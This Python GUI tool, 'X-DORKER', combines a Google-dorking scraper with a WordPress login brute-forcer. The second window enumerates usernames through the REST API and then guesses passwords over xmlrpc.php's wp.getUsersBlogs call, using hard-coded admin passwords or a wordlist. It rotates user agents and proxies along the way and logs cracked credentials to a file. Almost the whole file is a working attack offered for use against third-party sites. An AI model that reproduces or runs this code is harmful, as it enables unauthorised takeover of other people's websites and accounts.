import tkinter as tk
from PIL import Image, ImageTk
import os
import random
import sys
import time
import ssl
import wget
import threading
from fake_useragent import UserAgent
import requests
import urllib.request

global proxies_active
proxies_active = False

def set_proxy():
    global proxies_active
    data = frame_proxy.get("1.0", "end-1c")  # Get the text content from the status_codez Text widget
    if data:
        proxies_active = str(data)
    else:
        proxies_active = False

if sys.version_info[0] > 2:
    from http.cookiejar import LWPCookieJar
    from urllib.request import Request, urlopen
    from urllib.parse import quote_plus, urlparse, parse_qs
else:
    from cookielib import LWPCookieJar
    from urllib import quote_plus
    from urllib2 import Request, urlopen
    from urlparse import urlparse, parse_qs

try:
    from bs4 import BeautifulSoup
    is_bs4 = True
except ImportError:
    from bs4 import BeautifulSoup
    is_bs4 = False

__all__ = [

    # Main search function.
    'search',

    # Shortcut for "get lucky" search.
    'lucky',

    # Miscellaneous utility functions.
    'get_random_user_agent', 'get_tbs',
]

# URL templates to make Google searches.
url_home = "https://www.google.%(tld)s/"
url_search = "https://www.google.%(tld)s/search?hl=%(lang)s&q=%(query)s&" \
             "btnG=Google+Search&tbs=%(tbs)s&safe=%(safe)s&" \
             "cr=%(country)s"
url_next_page = "https://www.google.%(tld)s/search?hl=%(lang)s&q=%(query)s&" \
                "start=%(start)d&tbs=%(tbs)s&safe=%(safe)s&" \
                "cr=%(country)s"
url_search_num = "https://www.google.%(tld)s/search?hl=%(lang)s&q=%(query)s&" \
                 "num=%(num)d&btnG=Google+Search&tbs=%(tbs)s&safe=%(safe)s&" \
                 "cr=%(country)s"
url_next_page_num = "https://www.google.%(tld)s/search?hl=%(lang)s&" \
                    "q=%(query)s&num=%(num)d&start=%(start)d&tbs=%(tbs)s&" \
                    "safe=%(safe)s&cr=%(country)s"
url_parameters = (
    'hl', 'q', 'num', 'btnG', 'start', 'tbs', 'safe', 'cr')

# Cookie jar. Stored at the user's home folder.
# If the cookie jar is inaccessible, the errors are ignored.
home_folder = os.getenv('HOME')
if not home_folder:
    home_folder = os.getenv('USERHOME')
    if not home_folder:
        home_folder = '.'   # Use the current folder on error.
cookie_jar = LWPCookieJar(os.path.join(home_folder, '.google-cookie'))
try:
    cookie_jar.load()
except Exception:
    pass

# Default user agent, unless instructed by the user to change it.
USER_AGENT = 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)'

# Load the list of valid user agents from the install folder.
# The search order is:
#   * user_agents.txt.gz
#   * user_agents.txt
#   * default user agent
try:
    install_folder = os.path.abspath(os.path.split(__file__)[0])
    try:
        user_agents_file = os.path.join(install_folder, 'user_agents.txt.gz')
        import gzip
        fp = gzip.open(user_agents_file, 'rb')
        try:
            user_agents_list = [_.strip() for _ in fp.readlines()]
        finally:
            fp.close()
            del fp
    except Exception:
        user_agents_file = os.path.join(install_folder, 'user_agents.txt')
        with open(user_agents_file) as fp:
            user_agents_list = [_.strip() for _ in fp.readlines()]
except Exception:
    user_agents_list = [USER_AGENT]


# Get a random user agent.
def get_random_user_agent():
    """
    Get a random user agent string.

    :rtype: str
    :return: Random user agent string.
    """
    return random.choice(user_agents_list)
def get_tbs(from_date, to_date):
    from_date = from_date.strftime('%m/%d/%Y')
    to_date = to_date.strftime('%m/%d/%Y')
    return 'cdr:1,cd_min:%(from_date)s,cd_max:%(to_date)s' % vars()
def get_page(url, user_agent=None, verify_ssl=True):
    if user_agent is None:
        user_agent = USER_AGENT
    if proxies_active:
        proxy = f"http://{proxies_active}"
        proxy_handler = urllib.request.ProxyHandler({'http': proxy, 'https': proxy})
        opener = urllib.request.build_opener(proxy_handler)
    else:
        pass
    request = Request(url)
    request.add_header('User-Agent', user_agent)
    cookie_jar.add_cookie_header(request)
    if verify_ssl:
        response = opener.open(request) if proxies_active else urlopen(request)
    else:
        context = ssl._create_unverified_context()
        response = opener.open(request, context=context) if proxies_active else urlopen(request, context=context)
    cookie_jar.extract_cookies(response, request)
    html = response.read()
    response.close()
    try:
        cookie_jar.save()
    except Exception:
        pass
    return html
def filter_result(link):
    try:
        if link.startswith('/url?'):
            o = urlparse(link, 'http')
            link = parse_qs(o.query)['q'][0]
        o = urlparse(link, 'http')
        if o.netloc and 'google' not in o.netloc:
            return link
    except Exception:
        pass
def search(query, tld='com', lang='en', tbs='0', safe='off', num=10, start=0,
           stop=None, pause=2.0, country='', extra_params=None,
           user_agent=None, verify_ssl=True):
    hashes = set()
    count = 0
    query = quote_plus(query)
    if not extra_params:
        extra_params = {}
    for builtin_param in url_parameters:
        if builtin_param in extra_params.keys():
            raise ValueError(
                'GET parameter "%s" is overlapping with \
                the built-in GET parameter',
                builtin_param
            )
    get_page(url_home % vars(), user_agent, verify_ssl)
    if start:
        if num == 10:
            url = url_next_page % vars()
        else:
            url = url_next_page_num % vars()
    else:
        if num == 10:
            url = url_search % vars()
        else:
            url = url_search_num % vars()
    while not stop or count < stop:
        last_count = count
        for k, v in extra_params.items():
            k = quote_plus(k)
            v = quote_plus(v)
            url = url + ('&%s=%s' % (k, v))
        time.sleep(pause)
        html = get_page(url, user_agent, verify_ssl)
        if is_bs4:
            soup = BeautifulSoup(html, 'html.parser')
        else:
            soup = BeautifulSoup(html)
        try:
            anchors = soup.find(id='search').findAll('a')
        except AttributeError:
            gbar = soup.find(id='gbar')
            if gbar:
                gbar.clear()
            anchors = soup.findAll('a')
        for a in anchors:
            try:
                link = a['href']
            except KeyError:
                continue
            link = filter_result(link)
            if not link:
                continue
            h = hash(link)
            if h in hashes:
                continue
            hashes.add(h)
            yield link
            count += 1
            if stop and count >= stop:
                return
        if last_count == count:
            break
        start += num
        if num == 10:
            url = url_next_page % vars()
        else:
            url = url_next_page_num % vars()


# Shortcut to single-item search.
# Evaluates the iterator to return the single URL as a string.
def lucky(*args, **kwargs):
    """
    Shortcut to single-item search.

    Same arguments as the main search function, but the return value changes.

    :rtype: str
    :return: URL found by Google.
    """
    return next(search(*args, **kwargs))
# Global variable to control the search interruption

stop_search = False
saved = False
e_m = False
e_l = False

def saving_log(data):
    entry_content = entry_sas.get("1.0", "end-1c")  # Get the text content from the Text widget
    if '.txt' not in entry_content:
        entry_content += ".txt"
    with open(entry_content, 'a') as file:  # Gunakan 'a' untuk append ke file, bukan overwrite
        file.write(data + '\n')

def save_status_codes():
    data = status_codez.get("1.0", "end-1c")  # Get the text content from the status_codez Text widget
    saving_log(data)

def country():
    data = countrys.get("1.0", "end-1c")  # Get the text content from the status_codez Text widget
    return data

def execute(command):
    global stop_search, saved
    result = []
    code = []
    ua = UserAgent()
    cr = country()
    try:
        if e_m:
            print(command)
            for commands in command:
                if stop_search:
                    break
                for url in search(commands, start=0, stop=None, pause=1, num=1, country=cr):
                    if stop_search:
                        break
                    result.append(url)
                    # Update the output row with the current result
                    root.after(0, lambda url=url: update_result_partial(url))
                    try:
                        head = {"User-Agent": ua.chrome}
                        if proxies_active:
                            response = requests.get(url, timeout=5, headers=head, proxies={"http://": f"http://{proxies_active}", "https://": f"http://{proxies_active}"})
                        else:
                            response = requests.get(url, timeout=5, headers=head)
                        After_yes = f"{response.status_code} - {url}"
                        code.append(After_yes)
                        root.after(0, lambda After_yes=After_yes: update_result_partial_code(After_yes))
                        if response.status_code == 200:
                            output = os.mkdir('Output_File/{}'.format(url))
                            wget.download(url, out=output)
                        else:
                            pass
                    except requests.Timeout:
                        After_no = f"Timeout - {url}"
                        root.after(0, lambda After_no=After_no: update_result_partial_code(After_no))
                    except:
                        continue
                if not result:
                    result.append("No results found")
                if not code:
                    code.append("No results found")
        elif e_l:
            print(command)
            for url in search(command, start=0, stop=None, pause=1, num=1, country=cr):
                if stop_search:
                    break
                result.append(url)
                # Update the output row with the current result
                root.after(0, lambda url=url: update_result_partial(url))
                try:
                    head = {"User-Agent": ua.chrome}
                    if proxies_active:
                        response = requests.get(url, timeout=5, headers=head, proxies={"http://": f"http://{proxies_active}", "https://": f"http://{proxies_active}"})
                    else:
                        response = requests.get(url, timeout=5, headers=head)
                    After_yes = f"{response.status_code} - {url}"
                    code.append(After_yes)
                    root.after(0, lambda After_yes=After_yes: update_result_partial_code(After_yes))
                    if response.status_code == 200:
                        output = os.mkdir('Output_File/{}'.format(url))
                        wget.download(url, out=output)
                    else:
                        pass
                except requests.Timeout:
                    After_no = f"Timeout - {url}"
                    root.after(0, lambda After_no=After_no: update_result_partial_code(After_no))
                except:
                    continue
            if not result:
                result.append("No results found")
            if not code:
                code.append("No results found")
        else:
            result.append("Please insert dork")
    except Exception as e:
        result.append(str(e))
        print(e)
    return result

def execute_command():
    global stop_search, e_m, e_l
    stop_search = False
    e_m = True
    e_l = False
    command = entry_middle.get("1.0", tk.END)
    command = command.split('.-.')
    print(command)
    threading.Thread(target=run_execute, args=(command,)).start()

def execute_command_left():
    global stop_search, e_m, e_l
    stop_search = False
    e_m = False
    e_l = True
    command = entry_left.get("1.0", tk.END).strip()
    threading.Thread(target=run_execute, args=(command,)).start()

def run_execute(command):
    # Memulai animasi
    start_animation()
    result = execute(command)  # Eksekusi script yang ada di dalam fungsi execute
    # Mengupdate textrow kanan di main thread
    root.after(0, lambda: update_result_final(result))
    # Menghentikan animasi di main thread
    root.after(0, stop_animation)

def update_result_partial(result):
    entry_right.config(state="normal")  # Mengaktifkan mode edit untuk textrow kanan
    entry_right.insert(tk.END, result + "\n")  # Menambahkan hasil eksekusi ke textrow kanan
    entry_right.config(state="disabled")  # Mengatur textrow kanan menjadi mode baca saja
    
def update_result_partial_code(result):
    status_codez.config(state="normal")  # Mengaktifkan mode edit untuk textrow kanan
    status_codez.insert(tk.END, result + "\n")  # Menambahkan hasil eksekusi ke textrow kanan
    status_codez.config(state="disabled")  # Mengatur textrow kanan menjadi mode baca saja

def update_result_final(result):
    entry_right.config(state="normal")  # Mengaktifkan mode edit untuk textrow kanan
    entry_right.insert(tk.END, "\n".join(result) + "\n")  # Menambahkan hasil eksekusi ke textrow kanan
    entry_right.config(state="disabled")  # Mengatur textrow kanan menjadi mode baca saja
    
def update_result_code(resultz):
    status_codez.config(state="normal")  # Mengaktifkan mode edit untuk textrow kanan
    status_codez.insert(tk.END, "\n".join(resultz) + "\n")  # Menambahkan hasil eksekusi ke textrow kanan
    status_codez.config(state="disabled")  # Mengatur textrow kanan menjadi mode baca saja

def interrupt_search():
    global stop_search
    stop_search = True

def saving():
    global saved
    saved = True
    try:
        os.mkdir('Output_File')
    except:
        pass
    save_status_codes()

def split_text():
    text = entry_left.get("1.0", tk.END).strip()  # Mengambil teks dari textrow kiri
    split_text = text.split('.-.')  # Memisahkan teks menjadi kata-kata
    entry_middle.config(state="normal")  # Mengaktifkan mode edit untuk textrow tengah
    entry_middle.delete("1.0", tk.END)  # Menghapus teks yang ada di textrow tengah
    entry_middle.insert("1.0", split_text)  # Menambahkan teks yang telah dipisahkan ke textrow tengah
    entry_middle.config(state="disabled")  # Mengatur textrow tengah menjadi mode baca saja

def delete_text():
    entry_left.delete("1.0", tk.END)  # Menghapus teks yang ada di textrow kiri
    
def delete_output():
    entry_right.config(state="normal")  # Mengaktifkan mode edit untuk textrow kanan
    entry_right.delete("1.0", tk.END)  # Menghapus teks yang ada di textrow kanan
    entry_right.config(state="disabled")
    
def delete_scode():
    status_codez.config(state="normal")  # Mengaktifkan mode edit untuk textrow kanan
    status_codez.delete("1.0", tk.END)  # Menghapus teks yang ada di textrow kanan
    status_codez.config(state="disabled")

def start_animation():
    global working_text, animating
    working_text = ["Working.", "Working..", "Working..."]
    animating = True
    animate_text()

def stop_animation():
    global animating
    animating = False
    label_animation.config(text="")

def animate_text():
    if animating:
        current_text = working_text.pop(0)
        working_text.append(current_text)
        label_animation.config(text=current_text)
        root.after(500, animate_text)

# Membuat jendela utama
root = tk.Tk()
root.resizable(False, False)
root.title("X-DORKER By MrSanZz")

# Memuat dan menampilkan logo
image = Image.open('img/source/logo.png')  # Ubah path sesuai dengan lokasi logo Anda
image_resized = image.resize((230, 230), Image.LANCZOS)  # Mengubah ukuran logo menjadi 230x230 piksel
photo = ImageTk.PhotoImage(image_resized)
label_logo = tk.Label(root, image=photo)
label_logo.image = photo  # Menyimpan referensi agar gambar tidak hilang
label_logo.pack()
root.iconbitmap('img/source/logo.ico')

# Membuat frame untuk textrows dan tombol
frame = tk.Frame(root)
frame.pack(padx=10, pady=10)

frame2 = tk.Frame(root)
frame2.pack(side="right", padx=10, pady=10)

entry_sas = tk.Text(frame2, height=1, width=20)
entry_sas.grid(row=0, column=1, padx=5, pady=5)

button_save_scode = tk.Button(frame2, text="Save", command=saving)
button_save_scode.grid(row=1, column=1, padx=5, pady=5)

frame_proxy = tk.Text(frame2, height=1, width=20)
frame_proxy.grid(row=0, column=0, padx=5, pady=5)

button_set_proxy = tk.Button(frame2, text="Set Proxy", command=set_proxy)
button_set_proxy.grid(row=1, column=0, padx=5, pady=5)

countrys = tk.Text(frame2, height=1, width=5)
countrys.grid(row=0, column=2, padx=5, pady=5)

teks = tk.Label(frame, text="Status_Code")
teks.grid(row=1, column=0, padx=5, pady=5)

teks = tk.Label(frame, text="Input")
teks.grid(row=1, column=1, padx=5, pady=5)

teks = tk.Label(frame, text="Split")
teks.grid(row=1, column=2, padx=5, pady=5)

teks = tk.Label(frame, text="Output")
teks.grid(row=1, column=3, padx=5, pady=5)

status_codez = tk.Text(frame, height=10, width=35, state="disabled")
status_codez.grid(row=0, column=0, padx=5, pady=5)

entry_left = tk.Text(frame, height=10, width=40)
entry_left.grid(row=0, column=1, padx=5, pady=5)

entry_middle = tk.Text(frame, height=10, width=40, state="disabled")
entry_middle.grid(row=0, column=2, padx=5, pady=5)

entry_right = tk.Text(frame, height=10, width=34, state="disabled")
entry_right.grid(row=0, column=3, padx=5, pady=5)

button_frame = tk.Frame(root)
button_frame.pack(padx=10, pady=10)

button_execute = tk.Button(button_frame, text="Execute", command=execute_command)
button_execute.grid(row=0, column=0, padx=5, pady=5)

button_execute2 = tk.Button(button_frame, text="Execute (E Left)", command=execute_command_left)
button_execute2.grid(row=0, column=1, padx=5, pady=5)

button_interrupt = tk.Button(button_frame, text="Interrupt", command=interrupt_search)
button_interrupt.grid(row=0, column=2, padx=5, pady=5)

button_split = tk.Button(button_frame, text="Split", command=split_text)
button_split.grid(row=0, column=3, padx=5, pady=5)

button_delete_text = tk.Button(button_frame, text="Clear Input", command=delete_text)
button_delete_text.grid(row=0, column=4, padx=5, pady=5)

button_delete_output = tk.Button(button_frame, text="Clear Output", command=delete_output)
button_delete_output.grid(row=0, column=5, padx=5, pady=5)

button_delete_scode = tk.Button(button_frame, text="Clear Status_Code", command=delete_scode)
button_delete_scode.grid(row=0, column=6, padx=5, pady=5)

label_animation = tk.Label(root, text="")
label_animation.pack(pady=10)

new_window = tk.Toplevel(root)
new_window.resizable(False, False)
new_window.title("X-DORKER By MrSanZz - Wordpress Bypass")

# Memuat dan menampilkan logo
image = Image.open('img/source/logo.png')  # Ubah path sesuai dengan lokasi logo Anda
image_resized = image.resize((230, 230), Image.LANCZOS)  # Mengubah ukuran logo menjadi 230x230 piksel
photo = ImageTk.PhotoImage(image_resized)
label_logo = tk.Label(new_window, image=photo)
label_logo.image = photo  # Menyimpan referensi agar gambar tidak hilang
label_logo.pack()
new_window.iconbitmap('img/source/logo.ico')

interrupt = False
use_wordlist = False

def outdit(s):
    entry_out.config(state="normal")
    entry_out.insert(tk.END, "".join(s) + "\n")
    entry_out.config(state="disabled")

def outdit2(s):
    entry_out1.config(state="normal")
    entry_out1.insert(tk.END, "".join(s) + "\n")
    entry_out1.config(state="disabled")

# Fungsi untuk mengambil daftar username dari API WordPress
def get_usernames(url):
    try:
        ua = UserAgent()
        head = {"User-Agent": ua.chrome}
        users_url = url+ '/wp-json/wp/v2/users'
        response = requests.get(users_url, timeout=7, headers=head)

        if response.status_code == 200:
            users = response.json()
            usernames = []
            for user in users:
                for key in ['slug', 'name', 'username', 'author']:
                    if key in user:
                        usernames.append(user[key])
                        break
                else:
                    e2 = "Can't find username"
                    outdit(e2)
            return usernames
        else:
            e3 = f"Fail to get username from {url}"
            outdit(e3)
            return []
    except requests.exceptions.RequestException as e:
        e4 = f"Fail to get username from {url}"
        outdit(e4)
        return []

def parse(url):
    if '/wp-login.php' in url:
        url = url.replace('wp-login.php', '/xmlrpc.php')
    elif '/xmlrpc.php' in url:
        url = url
        pass
    elif '/xmlrpc.php' in url is None:
        url = url + '/xmlrpc.php'
    headers = {"User-Agent": UserAgent().chrome}
    response = requests.get(url, headers=headers, timeout=7)
    if response.status_code == 200 or response.status_code == 405:
        if 'XML-RPC' in response.text:
            out1 = "[+] Valid xmlrpc.php\n"
            outdit(out1)
        else:
            out2 = "[+] xmlrpc.php not detected in {}".format(url)
            outdit(out2)
            url = url + '/xmlrpc.php'
            out3 = "[+] Adding xmlrpc.php path to url {}\n".format(url)
            responses = requests.get(url, headers={"User-Agent": UserAgent().chrome}, timeout=7)
            if responses.status_code == 200:
                if 'XML-RPC' in responses.text:
                    azz = "[+] {} Is Valid - {}\n".format(url, responses.status_code)
            else:
                azz = "[+] {} Not Valid - {}\n".format(url, responses.status_code)
            outdit(out3)
            outdit(azz)
    else:
        out4 = "[+] Url is not valid! {}\n".format(response.status_code)
        outdit(out4)
        return url
# Fungsi untuk melakukan bruteforce login
def bruteforce(url):
    try:
        usernames = get_usernames(url)
        if usernames:
            oo = "[+] Username valid: {}".format(usernames)
        else:
            oo = "[+] Username not detected."
        outdit(oo)
        ea = 'Checking URL : {}'.format(url)
        outdit(ea)
        url = parse(url)

        if not usernames:
            usernames = ['admin']  # Jika tidak ada username yang ditemukan, coba dengan username default 'admin'
        if use_wordlist:
            with open(entry_word.get("1.0", "end-1c"), 'r') as file:
                worlist = file.readlines()
            for username in usernames:
                Signs = ['Archive', 'Archives', 'Author', 'Home', ',', ';', '\\']
                if any(Sign in username for Sign in Signs):
                    continue
                if username.lower() == 'admin':
                    for password in worlist:
                        xml_payload = """
                        <methodCall>
                            <methodName>wp.getUsersBlogs</methodName>
                            <params>
                                <param><value>{}</value></param>
                                <param><value>{}</value></param>
                            </params>
                        </methodCall>
                        """.format(username, password)
                        ua = UserAgent()
                        head = {"User-Agent": ua.chrome}
                        try:
                            response = requests.post(url, data=xml_payload, timeout=7, headers=head)

                            if 'blogName' in response.text:
                                s1 = f"!=Successfully=! {url}/wp-login.php#{username}@{password}"
                                outdit2(s1)
                                with open("result.txt", "a") as result_file:
                                    result_file.write(f"{url}/wp-login.php#{username}@{password}\n")
                                return True
                            else:
                                s2 = f"!=FAILED=! {url}/wp-login.php#{username}@{password}"
                                outdit(s2)
                            if interrupt:
                                break
                        except TimeoutError:
                            continue
                else:
                    for password in [username]:
                        xml_payload = """
                        <methodCall>
                            <methodName>wp.getUsersBlogs</methodName>
                            <params>
                                <param><value>{}</value></param>
                                <param><value>{}</value></param>
                            </params>
                        </methodCall>
                        """.format(username, password)
                        ua = UserAgent()
                        head = {"User-Agent": ua.chrome}
                        try:
                            response = requests.post(url, data=xml_payload, timeout=7, headers=head)

                            if 'blogName' in response.text:
                                s1 = f"!=Successfully=! {url}/wp-login.php#{username}@{password}"
                                outdit2(s1)
                                with open("result.txt", "a") as result_file:
                                    result_file.write(f"{url}/wp-login.php#{username}@{password}\n")
                                return True
                            else:
                                s2 = f"!=FAILED=! {url}/wp-login.php#{username}@{password}"
                                outdit(s2)
                            if interrupt:
                                break
                        except TimeoutError:
                            continue
        else:
            for username in usernames:
                Signs = ['Archive', 'Archives', 'Author', 'Home', ',', ';', '\\']
                if any(Sign in username for Sign in Signs):
                    continue
                if username.lower() == 'admin':
                    for password in ['admin', 'pass', 'user', 'administrator', 'demo', 'test', 'qwerty', 'root','Admin@123', 'admin@123', 'admin123', 'Admin', 'Admin11@', 'admin@123#', 'adminPass', 'Admin@123#', 'Password@123', 'admin2024', 'admin@2024','admin1234','admin2023','admin2025','admin2021','admin2022','admin1234','admin2019','admin2018','admincobain','admintest','adminbiasa','admin456','adminftp','admin1212','admin1313','admin1414','admin1515','admin1616','admin1717','admin1818','admin1919','admin2020','adminwordpres','adminaja','admin1','admin2','admin3','admin4','admin5','adminroot']:
                        xml_payload = """
                        <methodCall>
                            <methodName>wp.getUsersBlogs</methodName>
                            <params>
                                <param><value>{}</value></param>
                                <param><value>{}</value></param>
                            </params>
                        </methodCall>
                        """.format(username, password)
                        ua = UserAgent()
                        head = {"User-Agent": ua.chrome}
                        try:
                            response = requests.post(url, data=xml_payload, timeout=7, headers=head)

                            if 'blogName' in response.text:
                                s1 = f"!=Successfully=! {url}/wp-login.php#{username}@{password}"
                                outdit2(s1)
                                with open("result.txt", "a") as result_file:
                                    result_file.write(f"{url}/wp-login.php#{username}@{password}\n")
                                return True
                            else:
                                s2 = f"!=FAILED=! {url}/wp-login.php#{username}@{password}"
                                outdit(s2)
                            if interrupt:
                                break
                        except TimeoutError:
                            continue
                else:
                    for password in [username]:
                        xml_payload = """
                        <methodCall>
                            <methodName>wp.getUsersBlogs</methodName>
                            <params>
                                <param><value>{}</value></param>
                                <param><value>{}</value></param>
                            </params>
                        </methodCall>
                        """.format(username, password)
                        ua = UserAgent()
                        head = {"User-Agent": ua.chrome}
                        try:
                            response = requests.post(url, data=xml_payload, timeout=7, headers=head)

                            if 'blogName' in response.text:
                                s1 = f"!=Successfully=! {url}/wp-login.php#{username}@{password}"
                                outdit2(s1)
                                with open("result.txt", "a") as result_file:
                                    result_file.write(f"{url}/wp-login.php#{username}@{password}\n")
                                return True
                            else:
                                s2 = f"!=FAILED=! {url}/wp-login.php#{username}@{password}"
                                outdit(s2)
                            if interrupt:
                                break
                        except TimeoutError:
                            continue

    except requests.exceptions.RequestException as e:
        e6 = "Failed to connecting to the url"
        outdit(e6)
    except Exception as e:
        outdit(e)
        e7 = "An error occured"
        outdit(e7)
    return False

def main(url):
    # Gunakan daftar kata sandi yang telah tersedia
    bruteforce(url)

def execute_bps():
    urled = entry_saz.get("1.0", "end-1c")
    urled = urled.split()
    if not urled:
        requi = 'Please insert url.'
        outdit(requi)
    else:
        # Gunakan daftar kata sandi yang telah tersedia
        passwords = ['admin', 'pass', 'user', 'administrator', 'demo', 'test', 'qwerty', 'root','Admin@123', 'admin@123', 'admin123', 'Admin', 'Admin11@', 'admin@123#', 'adminPass', 'Admin@123#', 'Password@123', 'admin2024', 'admin@2024','admintest','adminwordpres','admin1234','admin@2023','admin@2022','adminlocalhost','admin@wordpres','admin@1945','admin@12345','admin@wp','admintest123','admin@party','admin@12345','adminqwerty','admin@pass','admin1453','test123#','test123','admin1337','adminwp','admin@user','admin@pass','adminroot']
        
        # Gunakan multiprocessing
        if interrupt is not True:
            for urls in urled:
                main(urls)
                if interrupt:
                    break

def start_animations():
    global working_text2z, animating2z
    working_text2z = ["Working /", "Working -", "Working \\", "Working |", "Working /", "Working -", "Working \\", "Working |"]
    animating2z = True
    animate_texts()

def stop_animations():
    global animating2z
    animating2z = False
    label_animation2.config(text="")

def animate_texts():
    if animating2z:
        current_text2z = working_text2z.pop(0)
        working_text2z.append(current_text2z)
        label_animation2.config(text=current_text2z)
        new_window.after(500, animate_texts)

def run_ekecute():
    # Memulai animasi
    start_animations()
    result = execute_bps()  # Eksekusi script yang ada di dalam fungsi execute
    # Mengupdate textrow kanan di main thread
    new_window.after(0, lambda: update_result_final(result))
    # Menghentikan animasi di main thread
    new_window.after(0, stop_animations)

def starting():
    global interrupt
    interrupt = False
    threading.Thread(target=run_ekecute).start()

def interrupt_bps():
    global interrupt
    interrupt = True

def clear_input():
    entry_saz.delete("1.0", tk.END)

def clear_output():
    entry_out.config(state="normal")
    entry_out.delete("1.0", tk.END)
    entry_out.config(state="disabled")

def clear_output2():
    entry_out1.config(state="normal")
    entry_out1.delete("1.0", tk.END)
    entry_out1.config(state="disabled")

def wordlist():
    global use_wordlist
    use_wordlist = True

def stop_wordlist():
    global use_wordlist
    use_wordlist = False

# Create frames
frame2z = tk.Frame(new_window)
frame2z.pack(side="right", padx=10, pady=10)

frame3z = tk.Frame(new_window)
frame3z.pack(padx=10, pady=10)

button_frame2z = tk.Frame(new_window)
button_frame2z.pack(padx=10, pady=10)

teks = tk.Label(frame3z, text="Word-List")
teks.grid(row=1, column=0, padx=5, pady=5)

teks = tk.Label(frame3z, text="Input")
teks.grid(row=1, column=1, padx=5, pady=5)

teks = tk.Label(frame3z, text="Output")
teks.grid(row=1, column=2, padx=5, pady=5)

teks = tk.Label(frame3z, text="Crack_Output")
teks.grid(row=1, column=3, padx=5, pady=5)

entry_word = tk.Text(frame3z, height=1, width=10)
entry_word.grid(row=0, column=0, padx=5, pady=5)

entry_saz = tk.Text(frame3z, height=10, width=40)
entry_saz.grid(row=0, column=1, padx=5, pady=5)

entry_out = tk.Text(frame3z, height=10, width=55, state="disabled")
entry_out.grid(row=0, column=2, padx=5, pady=5)

entry_out1 = tk.Text(frame3z, height=10, width=50, state="disabled")
entry_out1.grid(row=0, column=3, padx=5, pady=5)

button_frame = tk.Frame(new_window)
button_frame.pack(padx=10, pady=10)

button_execute = tk.Button(button_frame2z, text="Execute", command=starting)
button_execute.grid(row=0, column=0, padx=5, pady=5)

button_executes = tk.Button(button_frame2z, text="Use Wordlist", command=wordlist)
button_executes.grid(row=0, column=1, padx=5, pady=5)

button_executez = tk.Button(button_frame2z, text="Stop use Wordlist", command=stop_wordlist)
button_executez.grid(row=0, column=2, padx=5, pady=5)

button_interrupt = tk.Button(button_frame2z, text="Interrupt", command=interrupt_bps)
button_interrupt.grid(row=0, column=3, padx=5, pady=5)

button_split = tk.Button(button_frame2z, text="Clear Input", command=clear_input)
button_split.grid(row=0, column=4, padx=5, pady=5)

button_delete_text = tk.Button(button_frame2z, text="Clear Output", command=clear_output)
button_delete_text.grid(row=0, column=5, padx=5, pady=5)

button_split = tk.Button(button_frame2z, text="Clear Crack_Output", command=clear_output2)
button_split.grid(row=0, column=6, padx=5, pady=5)

label_animation2 = tk.Label(new_window, text="")
label_animation2.pack(pady=10)
root.mainloop()